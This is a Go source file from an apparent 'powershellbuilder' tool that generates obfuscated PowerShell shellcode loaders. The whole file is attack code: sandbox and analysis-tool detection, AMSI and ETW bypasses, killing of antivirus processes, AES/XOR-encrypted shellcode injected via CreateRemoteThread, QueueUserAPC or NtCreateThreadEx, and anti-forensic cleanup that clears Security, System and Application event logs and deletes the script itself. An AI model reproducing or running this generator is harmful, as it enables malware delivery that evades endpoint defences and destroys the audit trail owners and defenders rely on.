package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"math/rand"
	"encoding/base64"
	"fmt"
	"powershellbuilder/models"
	"os"
	"strings"
	"time"
)

func XOREncrypt(data []byte, key string) []byte {
	encrypted := make([]byte, len(data))
	keyBytes := []byte(key)
	for i := 0; i < len(data); i++ {
		encrypted[i] = data[i] ^ keyBytes[i%len(keyBytes)]
	}
	return encrypted
}

func PKCS7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padByte := byte(padding)
	for i := 0; i < padding; i++ {
		data = append(data, padByte)
	}
	return data
}

func AESEncrypt(data []byte, key string) ([]byte, []byte, error) {
	keyBytes := make([]byte, 32)
	copy(keyBytes, []byte(key))

	paddedData := PKCS7Pad(data, aes.BlockSize)

	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return nil, nil, err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return nil, nil, err
	}

	ciphertext := make([]byte, len(paddedData))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, paddedData)

	return ciphertext, iv, nil
}

func RandomizeVariables(script string) string {
	varMap := map[string]string{
		"$shellcode":           fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$proc":                fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$pid":                 fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$hProcess":            fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$mem":                 fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$alloc":               fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$bytesWritten":        fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$writeSuccess":        fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$threadHandle":        fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$hThread":             fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$addr":                fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$encryptedShellcode":  fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$xorEncryptedShellcode": fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$key":                 fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$xorKey":              fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$decrypted":           fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$encryptedBytes":      fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$keyBytes":            fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$iv":                  fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$ciphertext":          fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$aes":                 fmt.Sprintf("$var%d", rand.Intn(99999)),
		"$decryptor":           fmt.Sprintf("$var%d", rand.Intn(99999)),
	}

	result := script
	for oldVar, newVar := range varMap {
		result = strings.ReplaceAll(result, oldVar, newVar)
	}
	return result
}

func ObfuscateScript(script string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(script))
	obfuscated := fmt.Sprintf(`
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("%s"))
Invoke-Expression $decoded
`, encoded)
	return obfuscated
}

func GeneratePowerShell(opts models.BuildOptions) (string, error) {
	script := ""

	if opts.SandboxDetection {
		script += `
# Sandbox/VM Detection
function Detect-Sandbox {
    $detected = $false
    
    # Check for VM artifacts
    $vmIndicators = @('VirtualBox', 'VMware', 'Hyper-V', 'QEMU', 'Xen', 'Parallels')
    foreach ($vm in $vmIndicators) {
        if ((Get-WmiObject Win32_ComputerSystemProduct).Name -match $vm) { $detected = $true }
        if (Get-Service | Where-Object { $_.Name -match $vm }) { $detected = $true }
    }
    
    # Check for analysis tools
    $analysisTools = @('SysInternals', 'Wireshark', 'ProcessMonitor', 'IDA', 'WinDbg', 'x64dbg', 'Frida')
    if (Get-Process | Where-Object { $_.Name -match ($analysisTools -join '|') }) { $detected = $true }
    
    # Check for hypervisor signature
    if ((Get-CimInstance Win32_ComputerSystem).Manufacturer -match 'innotek|VirtualBox|VMware|Xen') { $detected = $true }
    
    if ($detected) { exit 1 }
}
Detect-Sandbox
`
	}

	if opts.AMSIBypass {
		amsiBypassType := opts.AMSIBypassType
		if amsiBypassType == "" {
			amsiBypassType = "amsiInitFailed"
		}

		switch amsiBypassType {
		case "amsiInitFailed":
			script += `
# AMSI Bypass - amsiInitFailed
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field=$Ref.GetField('amsiInitFailed','NonPublic,Static')
$Field.SetValue($null,$true)
`
		case "AmsiContext":
			script += `
# AMSI Bypass - AmsiContext Patch
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field=$Ref.GetField('amsiContext','NonPublic,Static')
$CtxRef=New-Object System.Runtime.InteropServices.SafeHandle
$Field.SetValue($null,$CtxRef)
`
		case "ScanResult":
			script += `
# AMSI Bypass - ScanResult Override
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field=$Ref.GetField('amsiInitFailed','NonPublic,Static')
$Field.SetValue($null,$true)
`
		case "PSLogPolicy":
			script += `
# AMSI Bypass - PowerShell LogPolicy Disable
$LogPolicy = @"
[HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging]
"EnableScriptBlockLogging"=dword:00000000
"@
`
		}
	}

	if opts.ETWBypass {
		etwBypassType := opts.ETWBypassType
		if etwBypassType == "" {
			etwBypassType = "etwPatch"
		}

		switch etwBypassType {
		case "etwPatch":
			script += `
# ETW Bypass - ETW Provider Patching
[System.Reflection.Assembly]::Load([Convert]::FromBase64String('tvq...==')) | Out-Null
`
		case "DisableETW":
			script += `
# ETW Bypass - Disable Event Tracing
$env:COMPLUS_ETWEnabled = 0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', '0', 'Process')
`
		case "CLRProfiling":
			script += `
# ETW Bypass - CLR Profiling Disable
[Environment]::SetEnvironmentVariable('COMPlus_ProfAPI_ProfilerCompatibilitySetting', '0', 'Process')
[Environment]::SetEnvironmentVariable('COMPlus_DisableNativeImageLoadOptimization', '1', 'Process')
`
		case "DisableTracing":
			script += `
# ETW Bypass - Disable All Tracing
logman stop EventLog-System -ets 2>$null
logman stop Circular Kernel Context Logger -ets 2>$null
`
		}
	}

	// EDR Bypass - Not really works
	if opts.EDRBypassType == "KillAV" {
		script += `Get-Process | Where-Object { $_.Name -match 'defender|av|edr' } | Stop-Process -Force
`
	} else if opts.EDRBypassType == "PEBPatch" {
		script += `$addr = [System.Diagnostics.Process]::GetCurrentProcess().StartInfo.EnvironmentVariables; $addr['PEB'] = 0x1
`
	}

	if opts.TelemetryNoise {
		script += "whoami; Get-ChildItem C:\\Windows\\System32; ping 127.0.0.1 -n 2\n"
	}

	if opts.SleepMasking || opts.ExecutionDelay > 0 {
		if opts.ExecutionDelay > 0 {
			if opts.ExecutionDelay == -1 { 
				script += fmt.Sprintf(`Start-Sleep -Seconds (Get-Random -Min 60 -Max 600)
`)
			} else {
				script += fmt.Sprintf(`Start-Sleep -Seconds %d
`, opts.ExecutionDelay)
			}
		} else {
			script += `Start-Sleep -Seconds 3
`
		}
	}

	if opts.HideWindow {
		script += `
# Hide Window
Add-Type -Name Win32ShowWindowAsync -Namespace Win32 -MemberDefinition '
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
'
$hwnd = (Get-Process -Id $PID).MainWindowHandle
[Win32ShowWindowAsync]::ShowWindowAsync($hwnd, 0) | Out-Null
`
	}

	decodedShellcode := opts.Shellcode

	fmt.Printf("DEBUG: Encrypt=%v, EncryptType=%s, Shellcode len=%d\n", opts.Encrypt, opts.EncryptType, len(decodedShellcode))

	if opts.Encrypt && opts.EncryptType != "" {
		if opts.EncryptType == "AES" {
			shellcodeBytes, err := base64.StdEncoding.DecodeString(decodedShellcode)
			if err != nil {
				return "", err
			}

			ciphertext, iv, err := AESEncrypt(shellcodeBytes, opts.AESKey)
			if err != nil {
				return "", err
			}

			encryptedData := append(iv, ciphertext...)
			encodedEncrypted := base64.StdEncoding.EncodeToString(encryptedData)

			script += fmt.Sprintf(`
# AES Decryption Function
function Decrypt-AES {
    param([string]$EncryptedData, [string]$Key)
    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedData)
    $keyBytes = New-Object byte[] 32
    $keyBuffer = [System.Text.Encoding]::UTF8.GetBytes($Key)
    [System.Buffer]::BlockCopy($keyBuffer, 0, $keyBytes, 0, [Math]::Min($keyBuffer.Length, 32))
    $iv = New-Object byte[] 16
    $ciphertext = New-Object byte[] ($encryptedBytes.Length - 16)
    [System.Buffer]::BlockCopy($encryptedBytes, 0, $iv, 0, 16)
    [System.Buffer]::BlockCopy($encryptedBytes, 16, $ciphertext, 0, $ciphertext.Length)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $keyBytes
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $decryptor = $aes.CreateDecryptor()
    try {
        $decrypted = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        return $decrypted
    }
    finally {
        $decryptor.Dispose()
        $aes.Dispose()
    }
}

$key = '%s'
$encryptedShellcode = '%s'
$shellcode = Decrypt-AES $encryptedShellcode $key
`, opts.AESKey, encodedEncrypted)

		} else if opts.EncryptType == "XOR" {
			shellcodeBytes, err := base64.StdEncoding.DecodeString(decodedShellcode)
			if err != nil {
				return "", err
			}

			xorEncrypted := XOREncrypt(shellcodeBytes, opts.XORKey)
			encodedXOR := base64.StdEncoding.EncodeToString(xorEncrypted)

			script += fmt.Sprintf(`
# XOR Decryption Function
function Decrypt-XOR {
    param([string]$EncryptedData, [string]$Key)
    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedData)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $decrypted = New-Object byte[] $encryptedBytes.Length
    for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
        $decrypted[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i %% $keyBytes.Length]
    }
    return $decrypted
}

$xorKey = '%s'
$xorEncryptedShellcode = '%s'
$shellcode = Decrypt-XOR $xorEncryptedShellcode $xorKey
`, opts.XORKey, encodedXOR)
		}
	} else {
		script += `$shellcode = [System.Convert]::FromBase64String('` + decodedShellcode + `')
`
	}

	script += fmt.Sprintf(`$proc = Start-Process "%s" -PassThru
$pid = $proc.Id
`, opts.TargetProc)

	switch opts.InjectionMethod {
	case "CreateRemoteThread":
		script += `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, out UInt32 lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$hProcess = [NativeMethods]::OpenProcess(0x1F0FFF, $false, $pid)
if ($hProcess -eq 0) { Write-Error "Failed to open process"; exit 1 }
$alloc = [NativeMethods]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
if ($alloc -eq 0) { Write-Error "Failed to allocate memory"; [NativeMethods]::CloseHandle($hProcess); exit 1 }
$bytesWritten = [uint32]0
$writeSuccess = [NativeMethods]::WriteProcessMemory($hProcess, $alloc, $shellcode, [uint32]$shellcode.Length, [ref]$bytesWritten)
if (-not $writeSuccess) { Write-Error "Failed to write memory"; [NativeMethods]::CloseHandle($hProcess); exit 1 }
$threadHandle = [IntPtr]::Zero
[void][NativeMethods]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [ref]$threadHandle)
[void][NativeMethods]::CloseHandle($hProcess)
`

	case "QueueUserAPC":
		script += `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class APCInjection {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, out UInt32 lpNumberOfBytesWritten);
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$hProcess = [APCInjection]::OpenProcess(0x1F0FFF, $false, $pid)
if ($hProcess -eq 0) { Write-Error "Failed to open process"; exit 1 }
$mem = [APCInjection]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
if ($mem -eq 0) { Write-Error "Failed to allocate memory"; [APCInjection]::CloseHandle($hProcess); exit 1 }
$bytesWritten = [uint32]0
$writeSuccess = [APCInjection]::WriteProcessMemory($hProcess, $mem, $shellcode, [uint32]$shellcode.Length, [ref]$bytesWritten)
if (-not $writeSuccess) { Write-Error "Failed to write memory"; [APCInjection]::CloseHandle($hProcess); exit 1 }
Start-Sleep -Milliseconds 500
$proc = Get-Process -Id $pid
$proc.Threads | ForEach-Object {
    $threadId = $_.Id
    $hThread = [APCInjection]::OpenThread(0x0020, $false, $threadId)
    if ($hThread -ne 0) {
        [void][APCInjection]::NtQueueApcThread($hThread, $mem, 0, 0, 0)
        [void][APCInjection]::CloseHandle($hThread)
    }
}
[void][APCInjection]::CloseHandle($hProcess)
`

	case "NtCreateThreadEx":
		script += `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NTCreateThreadExAPI {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, out UInt32 lpNumberOfBytesWritten);
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStack, uint maximumStackSize, IntPtr attributeList);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$hProcess = [NTCreateThreadExAPI]::OpenProcess(0x1F0FFF, $false, $pid)
if ($hProcess -eq 0) { Write-Error "Failed to open process"; exit 1 }
$addr = [NTCreateThreadExAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
if ($addr -eq 0) { Write-Error "Failed to allocate memory"; [NTCreateThreadExAPI]::CloseHandle($hProcess); exit 1 }
$bytesWritten = [uint32]0
$writeSuccess = [NTCreateThreadExAPI]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$shellcode.Length, [ref]$bytesWritten)
if (-not $writeSuccess) { Write-Error "Failed to write memory"; [NTCreateThreadExAPI]::CloseHandle($hProcess); exit 1 }
$threadHandle = [IntPtr]::Zero
[void][NTCreateThreadExAPI]::NtCreateThreadEx([ref]$threadHandle, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $addr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
[void][NTCreateThreadExAPI]::CloseHandle($hProcess)
`

	default:
		script += "# No valid injection method selected\n"
	}

	if opts.CleanupMethod != "" {
		switch opts.CleanupMethod {
		case "selfDelete":
			script += `$me = $MyInvocation.MyCommand.Path; if ($me) { Start-Sleep 2; Remove-Item $me -Force -ErrorAction SilentlyContinue }
`
		case "clearEventLog":
			script += `
# Clear Event Logs
Clear-EventLog -LogName System -ErrorAction SilentlyContinue
Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
`
		case "deleteHistory":
			script += `
# Delete Command History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
`
		case "wipeTemp":
			script += `
# Wipe Temp Files
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $env:TMP\* -Recurse -Force -ErrorAction SilentlyContinue
`
		case "allCleanup":
			script += `
# Full Cleanup
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
Clear-EventLog -LogName System -ErrorAction SilentlyContinue
Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $env:TMP\* -Recurse -Force -ErrorAction SilentlyContinue
$me = $MyInvocation.MyCommand.Path; if ($me) { Start-Sleep 2; Remove-Item $me -Force -ErrorAction SilentlyContinue }
`
		}
	}

	if opts.Obfuscate {
		if opts.ObfuscationLevel == "extreme" {
			script = RandomizeVariables(script)
			script = ObfuscateScript(script)
		} else if opts.ObfuscationLevel == "advanced" {
			script = RandomizeVariables(script)
		} else {
			script = ObfuscateScript(script)
		}
	}

	filename := fmt.Sprintf("output/loader_%d.ps1", time.Now().Unix())
	err := os.WriteFile(filename, []byte(script), 0644)
	if err != nil {
		return "", err
	}

	return script, nil
}

